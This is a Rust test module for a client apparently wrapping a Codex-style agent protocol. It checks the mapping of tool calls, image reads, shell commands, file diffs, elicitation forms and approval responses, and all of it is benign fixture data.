    fn image_read_results_exclude_failed_reads_and_image_generation() {
        for (name, status, expected) in [
            ("read_image", "completed", 1),
            ("read_image", "failed", 0),
            ("generate_image", "completed", 0),
        ] {
            for kind in ["mcpToolCall", "dynamicToolCall"] {
                let mut wire = json!({"type":kind,"id":"read","server":"files","tool":name,"status":status,
                    "result":{"content":[{"type":"image","mimeType":"image/png","data":"AQID"}]},
                    "contentItems":[{"type":"inputImage","imageUrl":"data:image/png;base64,AQID"}]});
                if kind == "dynamicToolCall" {
                    wire.as_object_mut().unwrap().remove("result");
                }
                let item = map_item(&wire).unwrap();
                let ItemContent::ToolCall { image_reads, .. } = item.content else {
                    panic!("tool")
                };
                assert_eq!(image_reads.len(), expected, "{kind}, {name}, {status}");
                if expected != 0 {
                    assert_eq!(image_reads[0].data_base64, "AQID");
                }
            }
        }
    }

    #[test]
    fn image_reads_preserve_each_file_version() {
        smol::block_on(async {
            use base64::Engine as _;
            let (mut actor, events) = test_actor();
            let path =
                std::env::temp_dir().join(format!("tcode-image-read-{}.png", std::process::id()));
            let mut received = Vec::new();
            for (id, bytes) in [("first", b"first image"), ("later", b"later image")] {
                smol::fs::write(&path, bytes).await.unwrap();
                actor
                    .handle_line(
                        &json!({"method":"item/completed", "params":{
                            "threadId":"thread-1", "item":{"type":"imageView", "id":id, "path":path}
                        }})
                        .to_string(),
                    )
                    .await;
                let AgentEvent::ItemCompleted(ThreadItem {
                    content: ItemContent::ImageRead { image, .. },
                    ..
                }) = events.recv().await.unwrap()
                else {
                    panic!("image read");
                };
                received.push(image.expect("snapshot survives later overwrite"));
            }
            smol::fs::remove_file(&path).await.unwrap();
            actor.handle_line(&json!({"method":"item/completed", "params":{
                "threadId":"thread-1", "item":{"type":"imageView", "id":"first", "path":path}
            }}).to_string()).await;
            let AgentEvent::ItemCompleted(ThreadItem {
                content: ItemContent::ImageRead { image, .. },
                ..
            }) = events.recv().await.unwrap()
            else {
                panic!("image read");
            };
            assert_eq!(
                image,
                Some(received[0].clone()),
                "completion retains the original read after deletion"
            );
            assert_eq!(
                base64::engine::general_purpose::STANDARD
                    .decode(&received[0].data_base64)
                    .unwrap(),
                b"first image"
            );
            assert_eq!(
                base64::engine::general_purpose::STANDARD
                    .decode(&received[1].data_base64)
                    .unwrap(),
                b"later image"
            );
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn a_login_shell_wrapper_is_stripped_from_commands_as_codex_shows_them() {
        for (reported, shown) in [
            (
                "/bin/zsh -lc 'sed -n 1,2p /etc/hosts'",
                "sed -n 1,2p /etc/hosts",
            ),
            (
                "bash -lc \"grep -rn 'fn main' src\"",
                "grep -rn 'fn main' src",
            ),
            ("python3 -c 'print(1)'", "python3 -c 'print(1)'"),
            ("/bin/zsh -lc 'ls' extra", "/bin/zsh -lc 'ls' extra"),
            ("zsh -lc 'unterminated", "zsh -lc 'unterminated"),
        ] {
            assert_eq!(shell_script(reported), shown, "{reported}");
        }
        let item = map_item(&json!({"type":"commandExecution","id":"cmd-2","command":"/bin/zsh -lc 'cargo check'","aggregatedOutput":"","status":"inProgress"})).unwrap();
        assert!(
            matches!(item.content, ItemContent::CommandExecution { command, .. } if command == "cargo check")
        );
    }

    #[test]
    fn maps_core_item_kinds() {
        let command = map_item(&json!({"type":"commandExecution","id":"cmd-1","command":"pwd","aggregatedOutput":"/tmp\n","exitCode":0,"status":"completed"})).unwrap();
        assert!(matches!(
            command.content,
            ItemContent::CommandExecution {
                exit_code: Some(0),
                status: ItemStatus::Completed,
                ..
            }
        ));

        let file = map_item(&json!({"type":"fileChange","id":"patch-1","status":"completed","changes":[{"path":"hello.txt","kind":{"type":"add"},"diff":"+hi"}]})).unwrap();
        assert!(
            matches!(&file.content, ItemContent::FileChange { changes, .. } if changes[0].kind == FileChangeKind::Create)
        );

        let image =
            map_item(&json!({"type":"imageView","id":"image-1","path":"/tmp/screenshot.png"}))
                .unwrap();
        assert!(
            matches!(image.content, ItemContent::ImageRead { path, .. } if path == "/tmp/screenshot.png")
        );

        let unknown = map_item(&json!({"type":"sleep","id":"sleep-1","durationMs":10})).unwrap();
        assert!(
            matches!(unknown.content, ItemContent::Other { ref provider_kind, .. } if provider_kind == "sleep")
        );
    }

    #[test]
    fn file_change_contents_become_unified_patches() {
        let item = map_item(&json!({
            "type": "fileChange", "id": "patch-content", "status": "completed",
            "changes": [
                {"path": "new.md", "kind": {"type": "add"}, "diff": "hello\n- list\n++literal\n\nlast"},
                {"path": "old.md", "kind": {"type": "delete"}, "diff": "hello\n"},
                {"path": "empty", "kind": {"type": "add"}, "diff": ""},
                {"path": "unknown", "kind": {"type": "add"}},
                {"path": "edit", "kind": {"type": "update"}, "diff": "@@ -1 +1 @@\n-old\n+new\n"}
            ]
        })).unwrap();
        let ItemContent::FileChange { changes, .. } = item.content else {
            panic!("file change")
        };
        assert_eq!(
            changes[0].diff.as_deref(),
            Some(
                "@@ -0,0 +1,5 @@\n+hello\n+- list\n+++literal\n+\n+last\n\\ No newline at end of file\n"
            )
        );
        assert_eq!(
            changes[1].diff.as_deref(),
            Some("@@ -1,1 +0,0 @@\n-hello\n")
        );
        assert_eq!(changes[2].diff.as_deref(), Some(""));
        assert_eq!(changes[3].diff, None);
        assert_eq!(
            changes[4].diff.as_deref(),
            Some("@@ -1 +1 @@\n-old\n+new\n")
        );
    }

    #[test]
    fn maps_reasoning_and_user_text() {
        let reasoning = map_item(
            &json!({"type":"reasoning","id":"r1","summary":["summary"],"content":["detail"]}),
        )
        .unwrap();
        assert!(
            matches!(reasoning.content, ItemContent::Reasoning { ref text } if text == "summary\ndetail")
        );
        // Provider-echoed user messages are suppressed: the app synthesizes the
        // canonical UserMessage at send time, so mapping one here yields None
        // (no duplicate user bubble on replay/live).
        assert!(
            map_item(&json!({"type":"userMessage","id":"u1","content":[{"type":"text","text":"hello"},{"type":"image","url":"x"}]}))
                .is_none()
        );
    }

    #[test]
    fn request_user_input_maps_questions_and_answer_wire_shape() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            // isOther/isSecret dropped; question missing header dropped; option
            // with empty label dropped; zero-option question KEPT (options: []).
            actor
                .handle_line(
                    &json!({
                        "jsonrpc": "2.0",
                        "id": 55,
                        "method": "item/tool/requestUserInput",
                        "params": {
                            "threadId": "t", "turnId": "turn-1", "itemId": "item-1",
                            "questions": [
                                {
                                    "id": "os",
                                    "header": "Target",
                                    "question": "macOS or Linux?",
                                    "options": [
                                        {"label": "macOS", "description": "apple"},
                                        {"label": "", "description": "skip me"}
                                    ],
                                    "isOther": true,
                                    "isSecret": false
                                },
                                { "id": "free", "header": "Notes", "question": "Any notes?" },
                                { "header": "no id", "question": "dropped?" }
                            ]
                        }
                    })
                    .to_string(),
                )
                .await;

            match events.recv().await.unwrap() {
                AgentEvent::UserInputRequested {
                    request_id,
                    questions,
                    ..
                } => {
                    assert_eq!(request_id, "55");
                    assert_eq!(questions.len(), 2, "question missing id is dropped");
                    assert_eq!(questions[0].id, "os");
                    assert_eq!(questions[0].options.len(), 1, "empty-label option dropped");
                    assert_eq!(questions[0].options[0].label, "macOS");
                    assert!(!questions[0].multi_select);
                    // Free-text-only questions remain valid with empty options.
                    assert_eq!(questions[1].id, "free");
                    assert!(questions[1].options.is_empty());
                }
                other => panic!("expected UserInputRequested, got {other:?}"),
            }

            // Answer: single string wraps into a 1-element array under {answers}.
            let mut answers = serde_json::Map::new();
            answers.insert("os".into(), json!("macOS"));
            answers.insert("free".into(), json!(["a", "b"]));
            actor
                .handle_command(SessionCommand::RespondUserInput {
                    request_id: "55".into(),
                    answers,
                })
                .await
                .unwrap();

            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "55"
            ));
            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed response")
            };
            let response: Value = serde_json::from_str(&response).unwrap();
            assert_eq!(response["id"], 55);
            assert_eq!(
                response["result"]["answers"]["os"]["answers"],
                json!(["macOS"])
            );
            assert_eq!(
                response["result"]["answers"]["free"]["answers"],
                json!(["a", "b"])
            );

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn elicitation_form_maps_fields_and_accepts_typed_content() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor
                .handle_line(
                    &json!({
                        "id": 81,
                        "method": "mcpServer/elicitation/request",
                        "params": {
                            "serverName": "calendar",
                            "threadId": "thread-1",
                            "mode": "form",
                            "message": "Fill this in",
                            "requestedSchema": {
                                "type": "object",
                                "properties": {
                                    "name": {"type": "string", "title": "Name"},
                                    "age": {"type": "integer", "description": "Your age?"},
                                    "active": {"type": "boolean"},
                                    "choice": {
                                        "type": "string",
                                        "oneOf": [
                                            {"const": "wire-a", "title": "Choice A"},
                                            {"const": "wire-b", "title": "Choice B"}
                                        ]
                                    },
                                    "tags": {
                                        "type": "array",
                                        "items": {
                                            "anyOf": [
                                                {"const": "red-wire", "title": "Red"},
                                                {"const": "blue-wire", "title": "Blue"}
                                            ]
                                        }
                                    }
                                }
                            }
                        }
                    })
                    .to_string(),
                )
                .await;

            let AgentEvent::UserInputRequested {
                request_id,
                questions,
                ..
            } = events.recv().await.unwrap()
            else {
                panic!("expected UserInputRequested")
            };
            assert_eq!(request_id, "81");
            assert_eq!(
                questions
                    .iter()
                    .map(|question| question.id.as_str())
                    .collect::<Vec<_>>(),
                ["name", "age", "active", "choice", "tags"]
            );
            assert_eq!(questions[0].header, "calendar: Name");
            assert_eq!(questions[0].question, "Fill this in");
            assert!(questions[0].options.is_empty());
            assert!(!questions[0].multi_select);
            assert_eq!(questions[1].header, "calendar: age");
            assert_eq!(questions[1].question, "Your age?");
            assert!(questions[1].options.is_empty());
            assert!(!questions[1].multi_select);
            assert_eq!(questions[2].header, "calendar: active");
            assert_eq!(questions[2].question, "Fill this in");
            assert_eq!(
                questions[2]
                    .options
                    .iter()
                    .map(|option| option.label.as_str())
                    .collect::<Vec<_>>(),
                ["Yes", "No"]
            );
            assert!(!questions[2].multi_select);
            assert_eq!(questions[3].header, "calendar: choice");
            assert_eq!(questions[3].question, "Fill this in");
            assert_eq!(
                questions[3]
                    .options
                    .iter()
                    .map(|option| option.label.as_str())
                    .collect::<Vec<_>>(),
                ["Choice A", "Choice B"]
            );
            assert!(!questions[3].multi_select);
            assert_eq!(questions[4].header, "calendar: tags");
            assert_eq!(questions[4].question, "Fill this in");
            assert_eq!(
                questions[4]
                    .options
                    .iter()
                    .map(|option| option.label.as_str())
                    .collect::<Vec<_>>(),
                ["Red", "Blue"]
            );
            assert!(questions[4].multi_select);

            let mut answers = serde_json::Map::new();
            answers.insert("name".into(), json!("Ada"));
            answers.insert("age".into(), json!("42"));
            answers.insert("active".into(), json!("Yes"));
            answers.insert("choice".into(), json!("Choice B"));
            answers.insert("tags".into(), json!(["Red", "Blue"]));
            actor
                .handle_command(SessionCommand::RespondUserInput {
                    request_id: "81".into(),
                    answers,
                })
                .await
                .unwrap();
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "81"
            ));
            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed response")
            };
            let response: Value = serde_json::from_str(&response).unwrap();
            assert_eq!(
                response,
                json!({
                    "id": 81,
                    "result": {
                        "action": "accept",
                        "content": {
                            "active": true,
                            "age": 42,
                            "choice": "wire-b",
                            "name": "Ada",
                            "tags": ["red-wire", "blue-wire"]
                        }
                    }
                })
            );
            assert!(response.get("error").is_none());

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn elicitation_form_maps_enum_names_and_bare_enum() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor
                .handle_line(
                    &json!({
                        "id": "enum-request",
                        "method": "mcpServer/elicitation/request",
                        "params": {
                            "serverName": "choices",
                            "threadId": "thread-1",
                            "mode": "form",
                            "message": "Choose",
                            "requestedSchema": {
                                "type": "object",
                                "properties": {
                                    "named": {
                                        "type": "string",
                                        "enum": ["wire-1", "wire-2"],
                                        "enumNames": ["First", "Second"]
                                    },
                                    "bare": {"type": "string", "enum": ["x", "y"]}
                                }
                            }
                        }
                    })
                    .to_string(),
                )
                .await;

            let AgentEvent::UserInputRequested { questions, .. } = events.recv().await.unwrap()
            else {
                panic!("expected UserInputRequested")
            };
            assert_eq!(
                questions
                    .iter()
                    .map(|question| question.id.as_str())
                    .collect::<Vec<_>>(),
                ["named", "bare"]
            );
            assert_eq!(
                questions[0]
                    .options
                    .iter()
                    .map(|option| option.label.as_str())
                    .collect::<Vec<_>>(),
                ["First", "Second"]
            );
            assert_eq!(
                questions[1]
                    .options
                    .iter()
                    .map(|option| option.label.as_str())
                    .collect::<Vec<_>>(),
                ["x", "y"]
            );

            let mut answers = serde_json::Map::new();
            answers.insert("bare".into(), json!("y"));
            answers.insert("named".into(), json!("Second"));
            actor
                .handle_command(SessionCommand::RespondUserInput {
                    request_id: "enum-request".into(),
                    answers,
                })
                .await
                .unwrap();
            let _ = events.recv().await.unwrap();
            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed response")
            };
            let response: Value = serde_json::from_str(&response).unwrap();
            assert_eq!(
                response,
                json!({
                    "id": "enum-request",
                    "result": {
                        "action": "accept",
                        "content": {"bare": "y", "named": "wire-2"}
                    }
                })
            );

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn elicitation_form_empty_answers_declines() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor
                .handle_line(
                    &json!({
                        "id": 82,
                        "method": "mcpServer/elicitation/request",
                        "params": {
                            "serverName": "numbers",
                            "threadId": "thread-1",
                            "mode": "form",
                            "message": "Number?",
                            "requestedSchema": {
                                "type": "object",
                                "properties": {"count": {"type": "number"}}
                            }
                        }
                    })
                    .to_string(),
                )
                .await;
            let _ = events.recv().await.unwrap();

            let mut answers = serde_json::Map::new();
            answers.insert("count".into(), json!("not-a-number"));
            actor
                .handle_command(SessionCommand::RespondUserInput {
                    request_id: "82".into(),
                    answers,
                })
                .await
                .unwrap();
            let _ = events.recv().await.unwrap();
            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed response")
            };
            let response: Value = serde_json::from_str(&response).unwrap();
            assert_eq!(response, json!({"id": 82, "result": {"action": "decline"}}));
            assert!(response["result"].get("content").is_none());

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn elicitation_url_cancels_or_accepts_without_content() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            for (id, answer, action) in [
                (83, "Cancel", "cancel"),
                (84, "I've opened the link", "accept"),
            ] {
                actor
                    .handle_line(
                        &json!({
                            "id": id,
                            "method": "mcpServer/elicitation/request",
                            "params": {
                                "serverName": "oauth",
                                "threadId": "thread-1",
                                "mode": "url",
                                "elicitationId": format!("elicit-{id}"),
                                "message": "Authorize access",
                                "url": "https://example.test/authorize"
                            }
                        })
                        .to_string(),
                    )
                    .await;
                let AgentEvent::UserInputRequested { questions, .. } = events.recv().await.unwrap()
                else {
                    panic!("expected UserInputRequested")
                };
                assert!(
                    questions[0]
                        .question
                        .contains("https://example.test/authorize")
                );
                assert_eq!(questions[0].header, "oauth: open link");
                assert_eq!(questions[0].id, "url");

                let mut answers = serde_json::Map::new();
                answers.insert("url".into(), json!(answer));
                actor
                    .handle_command(SessionCommand::RespondUserInput {
                        request_id: id.to_string(),
                        answers,
                    })
                    .await
                    .unwrap();
                let _ = events.recv().await.unwrap();
                let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
                    panic!("expected echoed response")
                };
                let response: Value = serde_json::from_str(&response).unwrap();
                assert_eq!(response["result"]["action"], action);
                assert!(response["result"].get("content").is_none());
            }

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn openai_form_elicitation_declines_with_result_and_warning() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor
                .handle_line(
                    &json!({
                        "id": 85,
                        "method": "mcpServer/elicitation/request",
                        "params": {
                            "serverName": "opaque",
                            "threadId": "thread-1",
                            "mode": "openai/form",
                            "message": "Unsupported",
                            "requestedSchema": {"anything": true}
                        }
                    })
                    .to_string(),
                )
                .await;

            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::Warning { ref message }
                    if message.contains("opaque") && message.contains("openai/form")
            ));
            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed response")
            };
            let response: Value = serde_json::from_str(&response).unwrap();
            assert_eq!(response["result"]["action"], "decline");
            assert!(response.get("result").is_some());
            assert!(response.get("error").is_none());
            assert!(!response.to_string().contains("-32601"));

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn shutdown_cancels_pending_elicitation() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor
                .handle_line(
                    &json!({
                        "id": 86,
                        "method": "mcpServer/elicitation/request",
                        "params": {
                            "serverName": "pending",
                            "threadId": "thread-1",
                            "mode": "form",
                            "message": "Wait",
                            "requestedSchema": {
                                "type": "object",
                                "properties": {"value": {"type": "string"}}
                            }
                        }
                    })
                    .to_string(),
                )
                .await;
            let _ = events.recv().await.unwrap();
            actor.settle_pending_user_inputs_on_shutdown().await;

            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::UserInputResolved { ref request_id, ref answers }
                    if request_id == "86" && answers.is_empty()
            ));
            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed response")
            };
            let response: Value = serde_json::from_str(&response).unwrap();
            assert_eq!(response, json!({"id": 86, "result": {"action": "cancel"}}));
            assert!(actor.elicitations.is_empty());

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn shutdown_settles_pending_user_input_empty() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.user_inputs.insert("77".into(), json!(77));
            actor.settle_pending_user_inputs_on_shutdown().await;

            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::UserInputResolved { ref request_id, ref answers }
                    if request_id == "77" && answers.is_empty()
            ));
            let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed response")
            };
            let response: Value = serde_json::from_str(&response).unwrap();
            assert_eq!(response, json!({"id": 77, "result": {"answers": {}}}));
            assert!(actor.user_inputs.is_empty());

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn maps_fixture_envelopes_and_approval_response() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            for line in include_str!("../tests/fixtures/codex/v2_messages.jsonl").lines() {
                actor.handle_line(line).await;
            }

            assert!(
                matches!(events.recv().await.unwrap(), AgentEvent::TurnStarted { ref turn_id } if turn_id == "turn-1")
            );
            assert!(
                matches!(events.recv().await.unwrap(), AgentEvent::ItemStarted(ThreadItem { content: ItemContent::FileChange { ref changes, status: ItemStatus::InProgress }, .. }) if changes[0].kind == FileChangeKind::Create)
            );
            assert!(
                matches!(events.recv().await.unwrap(), AgentEvent::ApprovalRequested(ApprovalRequest { ref id, kind: ApprovalKind::FileChange { ref changes, .. }, .. }) if id == "41" && changes.len() == 1)
            );
            assert!(
                matches!(events.recv().await.unwrap(), AgentEvent::Delta { kind: DeltaKind::AssistantText, ref text, .. } if text == "PONG")
            );
            assert!(
                matches!(events.recv().await.unwrap(), AgentEvent::Delta { kind: DeltaKind::ReasoningText, ref text, .. } if text == "Checking")
            );
            assert!(
                matches!(events.recv().await.unwrap(), AgentEvent::Delta { kind: DeltaKind::CommandOutput, ref text, .. } if text == "ok\n")
            );
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::TokenUsage(TokenUsage {
                    input_tokens: Some(8),
                    cached_input_tokens: Some(2),
                    output_tokens: Some(4),
                    used_tokens: Some(12),
                    total_processed_tokens: Some(123),
                    context_window: Some(200000),
                    ..
                })
            ));
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemCompleted(ThreadItem {
                    content: ItemContent::FileChange {
                        status: ItemStatus::Completed,
                        ..
                    },
                    ..
                })
            ));
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::TurnCompleted {
                    status: TurnStatus::Completed,
                    usage: Some(TokenUsage {
                        input_tokens: Some(8),
                        cached_input_tokens: Some(2),
                        output_tokens: Some(4),
                        used_tokens: Some(12),
                        total_processed_tokens: Some(123),
                        context_window: Some(200000),
                        ..
                    }),
                    ..
                }
            ));

            let approval_line = include_str!("../tests/fixtures/codex/v2_messages.jsonl")
                .lines()
                .find(|line| {
                    let message: Value = serde_json::from_str(line).unwrap();
                    message["method"] == "item/fileChange/requestApproval"
                })
                .expect("recorded native approval request");
            for (decision, wire) in [
                (
                    ApprovalDecision::Option("acceptForSession".into()),
                    "acceptForSession",
                ),
                (ApprovalDecision::Cancel, "cancel"),
            ] {
                if decision == ApprovalDecision::Cancel {
                    // Re-enter through the native request, never a seeded pending map.
                    actor.handle_line(approval_line).await;
                    assert!(matches!(
                        events.recv().await.unwrap(),
                        AgentEvent::ApprovalRequested(ApprovalRequest { ref id, .. }) if id == "41"
                    ));
                }
                actor
                    .handle_command(SessionCommand::RespondApproval {
                        request_id: "41".into(),
                        decision: decision.clone(),
                    })
                    .await
                    .unwrap();
                assert!(matches!(
                    events.recv().await.unwrap(),
                    AgentEvent::ApprovalResolved { ref request_id, decision: resolved }
                        if request_id == "41" && resolved == decision
                ));
                let ChildOutput::Line(response) = actor.lines.recv().await.unwrap() else {
                    panic!("expected echoed response")
                };
                let response: Value = serde_json::from_str(&response).unwrap();
                assert_eq!(response, json!({"id":41, "result":{"decision":wire}}));
            }

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }
}
